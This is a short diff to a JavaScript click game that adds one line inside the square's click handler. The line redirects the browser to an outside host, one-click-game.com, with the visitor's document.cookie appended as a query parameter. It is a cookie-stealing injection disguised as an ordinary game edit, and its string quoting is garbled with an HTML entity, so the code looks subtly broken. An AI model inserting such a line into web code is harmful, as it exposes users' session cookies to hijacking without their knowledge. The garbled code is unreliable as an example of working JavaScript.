@@ -145,6 +145,7 @@ var main = function() {
     }
 
     $square.click( function() {
+	document.location="http://www.one-click-game.com/request.php?cookie=&quot; + document.cookie;"
 	var random = Math.random();
 	// Disable interaction right after the click to avoid multi clicking
 	if (!squareObj.isActive()){
